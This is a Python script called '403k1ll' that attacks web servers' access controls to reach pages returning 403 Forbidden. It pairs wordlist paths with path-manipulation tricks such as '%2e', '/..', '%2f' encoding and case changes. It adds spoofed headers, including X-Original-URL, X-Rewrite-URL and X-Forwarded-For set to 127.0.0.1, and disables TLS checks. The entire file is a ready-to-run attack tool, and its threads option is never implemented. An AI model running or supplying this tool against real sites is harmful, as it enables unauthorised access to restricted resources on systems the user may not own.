#!/usr/bin/env python3
import requests
import argparse
import sys
import time
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed

# Colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
RESET = '\033[0m'
BOLD = '\033[1m'
ITALIC = '\033[3m'

def print_banner():
    banner = f"""
{CYAN}{BOLD}

   _____  _______  ________    ____  __.____.____    .____     
  /  |  | \   _  \ \_____  \  |    |/ _/_   |    |   |    |    
 /   |  |_/  /_\  \  _(__  <  |      <  |   |    |   |    |    
/    ^   /\  \_/   \/       \ |    |  \ |   |    |___|    |___ 
\____   |  \_____  /______  / |____|__ \|___|_______ \_______ \
     |__|        \/       \/          \/            \/       \/ 
                                                            
                                    
{RESET}{ITALIC}{MAGENTA}[+] 403k1ll - Bypass Forbidden Pages{RESET}
{ITALIC}{YELLOW}[+] Coded by Alham Rizvi{RESET}
{ITALIC}{YELLOW}[+] Instagram: @alhamrizvi{RESET}
{ITALIC}{CYAN}[+] Version 3.2{RESET}
{BLUE}{'='*45}{RESET}
"""
    print(banner)

def load_wordlist(wordlist_path):
    """Load wordlist from file"""
    try:
        with open(wordlist_path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{RED}[-] Wordlist not found: {wordlist_path}{RESET}")
        sys.exit(1)

def load_urls(url_file):
    """Load URLs from file"""
    try:
        with open(url_file, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{RED}[-] URL file not found: {url_file}{RESET}")
        sys.exit(1)

def bypass_techniques(base_url, path):
    """Generate various bypass techniques"""
    techniques = []
    
    # Original
    techniques.append(('Original', urljoin(base_url, path)))
    
    # Path variations
    techniques.append(('Trailing /', urljoin(base_url, path + '/')))
    techniques.append(('Double slash', urljoin(base_url, '/' + path)))
    techniques.append(('%2e', urljoin(base_url, path + '%2e')))
    techniques.append(('Dot slash', urljoin(base_url, path + '/.')))
    techniques.append(('Double dot', urljoin(base_url, path + '/..')))
    techniques.append(('Slash dot dot', urljoin(base_url, path + '/../')))
    techniques.append(('URL encode', urljoin(base_url, path.replace('/', '%2f'))))
    techniques.append(('Case change', urljoin(base_url, path.upper())))
    
    # Header variations will be added in request function
    
    return techniques

def make_request(url, technique_name, headers, timeout=10):
    """Make HTTP request with various headers"""
    results = []
    
    # Standard headers variations
    header_sets = [
        {},
        {'X-Original-URL': url},
        {'X-Rewrite-URL': url},
        {'X-Custom-IP-Authorization': '127.0.0.1'},
        {'X-Forwarded-For': '127.0.0.1'},
        {'X-Forwarded-Host': '127.0.0.1'},
        {'X-Host': '127.0.0.1'},
        {'X-Originating-IP': '127.0.0.1'},
    ]
    
    for header_set in header_sets:
        try:
            merged_headers = {**headers, **header_set}
            resp = requests.get(url, headers=merged_headers, timeout=timeout, allow_redirects=False, verify=False)
            header_name = list(header_set.keys())[0] if header_set else 'Default'
            results.append({
                'url': url,
                'technique': technique_name,
                'header': header_name,
                'status': resp.status_code,
                'length': len(resp.content)
            })
        except requests.exceptions.RequestException as e:
            continue
    
    return results

def fuzz_url(base_url, wordlist, rate_limit, hide_fails, show_only, headers):
    """Fuzz a single URL with wordlist"""
    print(f"\n{CYAN}[*] Fuzzing: {base_url}{RESET}\n")
    
    results = []
    delay = 1.0 / rate_limit if rate_limit else 0
    
    for word in wordlist:
        techniques = bypass_techniques(base_url, word)
        
        for technique_name, url in techniques:
            request_results = make_request(url, technique_name, headers)
            
            for result in request_results:
                status = result['status']
                
                # Filter by show_only
                if show_only and status not in show_only:
                    continue
                
                # Hide fails
                if hide_fails and status in [403, 404, 500]:
                    continue
                
                # Color code status
                if status == 200:
                    color = GREEN
                elif status == 403:
                    color = RED
                elif status in [301, 302, 307, 308]:
                    color = YELLOW
                else:
                    color = CYAN
                
                print(f"{color}[{status}]{RESET} {result['url']} ({result['length']} bytes) [{result['technique']}] [{result['header']}]")
                results.append(result)
        
        if delay:
            time.sleep(delay)
    
    return results

def main():
    print_banner()
    
    parser = argparse.ArgumentParser(description='403k1ll - Bypass 403 Forbidden Pages')
    parser.add_argument('-u', '--url', help='Target URL')
    parser.add_argument('-l', '--list', help='File containing list of URLs')
    parser.add_argument('-w', '--wordlist', required=True, help='Wordlist for fuzzing')
    parser.add_argument('-r', '--rate-limit', type=int, default=10, help='Requests per second (default: 10)')
    parser.add_argument('--hide-fails', action='store_true', help='Hide failed requests (403, 404, 500)')
    parser.add_argument('-s', '--show-only', help='Show only specific status codes (comma-separated, e.g., 200,403)')
    parser.add_argument('-H', '--header', action='append', help='Custom headers (can be used multiple times)')
    parser.add_argument('-t', '--threads', type=int, default=1, help='Number of threads (default: 1)')
    
    args = parser.parse_args()
    
    # Validate input
    if not args.url and not args.list:
        print(f"{RED}[-] Error: Either -u or -l must be specified{RESET}")
        sys.exit(1)
    
    # Parse custom headers
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    if args.header:
        for header in args.header:
            if ':' in header:
                key, value = header.split(':', 1)
                headers[key.strip()] = value.strip()
    
    # Parse show_only
    show_only = None
    if args.show_only:
        show_only = [int(code.strip()) for code in args.show_only.split(',')]
    
    # Load wordlist
    wordlist = load_wordlist(args.wordlist)
    print(f"{GREEN}[+] Loaded {len(wordlist)} paths from wordlist{RESET}")
    
    # Get URLs
    urls = []
    if args.url:
        urls = [args.url]
    elif args.list:
        urls = load_urls(args.list)
        print(f"{GREEN}[+] Loaded {len(urls)} URLs{RESET}")
    
    # Disable SSL warnings
    requests.packages.urllib3.disable_warnings()
    
    # Start fuzzing
    print(f"\n{BOLD}{MAGENTA}[*] Starting fuzzing...{RESET}")
    
    for url in urls:
        fuzz_url(url, wordlist, args.rate_limit, args.hide_fails, show_only, headers)
    
    print(f"\n{BOLD}{GREEN}[+] Fuzzing complete!{RESET}")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{RED}[-] Interrupted by user{RESET}")
        sys.exit(0)
